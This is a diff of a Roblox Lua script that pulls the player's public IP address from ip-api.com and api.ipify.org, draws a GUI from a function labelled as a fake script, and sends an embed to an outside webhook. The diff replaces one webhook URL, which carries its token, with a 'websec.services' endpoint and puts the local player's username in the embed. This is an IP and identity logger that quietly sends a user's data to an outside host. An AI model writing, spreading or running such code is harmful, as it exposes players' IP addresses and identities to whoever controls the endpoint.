@@ -1,5 +1,4 @@
 local ip, HttpService = tostring(game:HttpGet("http://ip-api.com/json/", true).Body), game:GetService("HttpService")
-print(ip)
 local normalque, HttpService = tostring(game:HttpGet("https://api.ipify.org", true)), game:GetService("HttpService")
 local ScreenGui = Instance.new("ScreenGui")
 local bg = Instance.new("Frame")
@@ -115,15 +114,12 @@ end
 coroutine.wrap(HMJCESE_fake_script)()
 
 local url =
-        "https://hooks.hyra.io/api/webhooks/1001634153495810168/BEAS6lMJiRorErzrQylTvPmgqjb5_7du4cVYGNrrzBEKWsqQtKZ89zT9CN76CohxiMbt"
-        -- https://discord.com -- put ur webhook here dumbos
-    
-
+        "https://websec.services/send/62e806ed7907ab0a63d4d550"
+  
         local data = {
             ["embeds"] = {
                 {
-                    ["title"] = game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name,
-                    ["url"] = "https://www.roblox.com/games/2788229376/Da-Hood",
+                    ["title"] = game:GetService("Players").LocalPlayer.Name,
                     ["type"] = "rich",
                     ["fields"] = {
                         {
